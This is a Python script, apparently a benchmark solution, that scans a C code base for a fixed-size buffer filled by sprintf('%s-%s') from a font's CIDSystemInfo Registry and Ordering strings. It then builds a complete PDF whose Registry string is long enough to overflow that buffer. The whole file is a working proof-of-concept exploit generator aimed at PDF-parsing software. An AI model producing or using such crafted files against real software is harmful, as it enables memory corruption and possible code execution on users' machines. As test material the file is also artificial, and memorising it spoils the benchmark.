import os
import re
import tarfile
import ast
from typing import Dict, Optional, Iterable, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        defines = self._collect_defines(src_path)
        candidates = self._collect_vuln_buffer_candidates(src_path, defines)
        buf_size = min(candidates) if candidates else None

        if buf_size is None or buf_size <= 0:
            reg_len = 80000
        else:
            # Overflow condition for sprintf("%s-%s"): reg + '-' + ord + '\0'
            # Keep ordering empty => reg_len + 2 > buf_size
            reg_len = max(1, buf_size + 16)

        registry = b"A" * reg_len
        ordering = b""

        return self._build_pdf(registry, ordering)

    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        def is_source_file(name: str) -> bool:
            lower = name.lower()
            if any(lower.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
                return True
            return False

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not is_source_file(fn):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    yield path, data.decode("latin1", errors="ignore")
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name
                        if not is_source_file(name):
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        yield name, data.decode("latin1", errors="ignore")
            except Exception:
                return

    def _strip_c_comments(self, s: str) -> str:
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
        s = re.sub(r"//.*?$", "", s, flags=re.M)
        return s

    def _collect_defines(self, src_path: str) -> Dict[str, str]:
        defines: Dict[str, str] = {}
        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$", re.M)
        for _, text in self._iter_source_texts(src_path):
            text2 = self._strip_c_comments(text)
            for m in define_re.finditer(text2):
                name = m.group(1)
                val = m.group(2).strip()
                if not val:
                    continue
                if "\\" in val:
                    continue
                if any(tok in val for tok in ("sizeof", "{", "}", ";", "typedef", "struct", "class", "template")):
                    continue
                defines.setdefault(name, val)
        return defines

    def _safe_eval_int(self, expr: str, defines: Dict[str, str], depth: int = 0) -> Optional[int]:
        if depth > 20:
            return None
        expr = expr.strip()
        if not expr:
            return None

        while True:
            e2 = expr.strip()
            if e2.startswith("(") and e2.endswith(")"):
                inner = e2[1:-1].strip()
                if inner:
                    expr = inner
                    continue
            break

        if re.fullmatch(r"[A-Za-z_]\w*", expr):
            if expr in defines:
                return self._safe_eval_int(defines[expr], defines, depth + 1)
            return None

        if re.fullmatch(r"0[xX][0-9A-Fa-f]+", expr):
            try:
                return int(expr, 16)
            except ValueError:
                return None
        if re.fullmatch(r"\d+", expr):
            try:
                return int(expr, 10)
            except ValueError:
                return None

        try:
            tree = ast.parse(expr, mode="eval")
        except Exception:
            return None

        allowed_binops = (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Div, ast.Mod,
                          ast.LShift, ast.RShift, ast.BitAnd, ast.BitOr, ast.BitXor)
        allowed_unops = (ast.UAdd, ast.USub)

        def eval_node(node) -> Optional[int]:
            if isinstance(node, ast.Expression):
                return eval_node(node.body)
            if isinstance(node, ast.Constant):
                if isinstance(node.value, int):
                    return int(node.value)
                return None
            if isinstance(node, ast.Num):
                return int(node.n)
            if isinstance(node, ast.Name):
                if node.id in defines:
                    return self._safe_eval_int(defines[node.id], defines, depth + 1)
                return None
            if isinstance(node, ast.UnaryOp) and isinstance(node.op, allowed_unops):
                v = eval_node(node.operand)
                if v is None:
                    return None
                if isinstance(node.op, ast.UAdd):
                    return +v
                return -v
            if isinstance(node, ast.BinOp) and isinstance(node.op, allowed_binops):
                a = eval_node(node.left)
                b = eval_node(node.right)
                if a is None or b is None:
                    return None
                try:
                    if isinstance(node.op, ast.Add):
                        return a + b
                    if isinstance(node.op, ast.Sub):
                        return a - b
                    if isinstance(node.op, ast.Mult):
                        return a * b
                    if isinstance(node.op, ast.FloorDiv):
                        return a // b
                    if isinstance(node.op, ast.Div):
                        return a // b
                    if isinstance(node.op, ast.Mod):
                        return a % b
                    if isinstance(node.op, ast.LShift):
                        return a << b
                    if isinstance(node.op, ast.RShift):
                        return a >> b
                    if isinstance(node.op, ast.BitAnd):
                        return a & b
                    if isinstance(node.op, ast.BitOr):
                        return a | b
                    if isinstance(node.op, ast.BitXor):
                        return a ^ b
                except Exception:
                    return None
            return None

        return eval_node(tree)

    def _collect_vuln_buffer_candidates(self, src_path: str, defines: Dict[str, str]) -> List[int]:
        candidates: List[int] = []
        char_decl_re = re.compile(
            r"\bchar\s+([A-Za-z_]\w*)\s*\[\s*([A-Za-z_]\w*|0[xX][0-9A-Fa-f]+|\d+|\([^;\]]+\))\s*\]\s*;",
            re.M
        )
        sprintf_re = re.compile(r"\bsprintf\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"([^\"]*)\"", re.M)
        strcat_dash_re = re.compile(r"\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,\s*\"-\"\s*\)", re.M)

        for _, text in self._iter_source_texts(src_path):
            if "CIDSystemInfo" not in text:
                continue
            if "Registry" not in text or "Ordering" not in text:
                continue

            text2 = self._strip_c_comments(text)

            var_sizes: Dict[str, int] = {}
            for m in char_decl_re.finditer(text2):
                var = m.group(1)
                sz_expr = m.group(2).strip()
                sz = self._safe_eval_int(sz_expr, defines)
                if sz is not None and 1 <= sz <= 10_000_000:
                    var_sizes[var] = sz

            if not var_sizes:
                continue

            for m in sprintf_re.finditer(text2):
                var = m.group(1)
                fmt = m.group(2)
                if var not in var_sizes:
                    continue
                if fmt.count("%s") < 2:
                    continue
                if "-" not in fmt:
                    continue
                start = max(0, m.start() - 600)
                end = min(len(text2), m.end() + 600)
                snippet = text2[start:end]
                if "Registry" in snippet and "Ordering" in snippet:
                    candidates.append(var_sizes[var])

            for m in strcat_dash_re.finditer(text2):
                var = m.group(1)
                if var not in var_sizes:
                    continue
                start = max(0, m.start() - 800)
                end = min(len(text2), m.end() + 800)
                snippet = text2[start:end]
                if "CIDSystemInfo" in snippet and "Registry" in snippet and "Ordering" in snippet:
                    candidates.append(var_sizes[var])

            if not candidates:
                for var, sz in var_sizes.items():
                    v = var.lower()
                    if ("collect" in v or "collection" in v or "fallback" in v or "name" in v) and 1 <= sz <= 1_000_000:
                        startpos = text2.lower().find(var.lower())
                        if startpos != -1:
                            s = max(0, startpos - 800)
                            e = min(len(text2), startpos + 800)
                            snippet = text2[s:e]
                            if "CIDSystemInfo" in snippet and "Registry" in snippet and "Ordering" in snippet:
                                candidates.append(sz)

        return candidates

    def _pdf_string(self, raw: bytes) -> bytes:
        if not raw:
            return b"()"
        return b"(" + raw + b")"

    def _build_pdf(self, registry: bytes, ordering: bytes) -> bytes:
        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

        contents_stream = b"BT /F1 12 Tf 10 10 Td (A) Tj ET\n"
        length_val = str(len(contents_stream)).encode("ascii")

        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200]\n" \
               b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>\nendobj\n"
        obj4 = b"4 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /AAAA /Encoding /Identity-H\n" \
               b"/DescendantFonts [6 0 R] >>\nendobj\n"
        obj5 = b"5 0 obj\n<< /Length " + length_val + b" >>\nstream\n" + contents_stream + b"endstream\nendobj\n"

        cid_sys_info = b"<< /Registry " + self._pdf_string(registry) + b" /Ordering " + self._pdf_string(ordering) + b" /Supplement 0 >>"
        obj6 = b"6 0 obj\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont /AAAA\n" \
               b"/CIDSystemInfo " + cid_sys_info + b"\n" \
               b"/FontDescriptor 7 0 R /CIDToGIDMap /Identity /DW 1000 /W [0 [1000]] >>\nendobj\n"

        obj7 = b"7 0 obj\n<< /Type /FontDescriptor /FontName /AAAA /Flags 4\n" \
               b"/FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200\n" \
               b"/CapHeight 700 /StemV 80 >>\nendobj\n"

        objects = [obj1, obj2, obj3, obj4, obj5, obj6, obj7]

        offsets = [0] * 8
        buf = bytearray()
        buf += header
        pos = len(buf)

        for i, obj in enumerate(objects, start=1):
            offsets[i] = pos
            buf += obj
            pos += len(obj)

        xref_pos = pos
        buf += b"xref\n0 8\n"
        buf += b"0000000000 65535 f \n"
        for i in range(1, 8):
            off = offsets[i]
            buf += f"{off:010d} 00000 n \n".encode("ascii")

        buf += b"trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n"
        buf += str(xref_pos).encode("ascii") + b"\n%%EOF\n"
        return bytes(buf)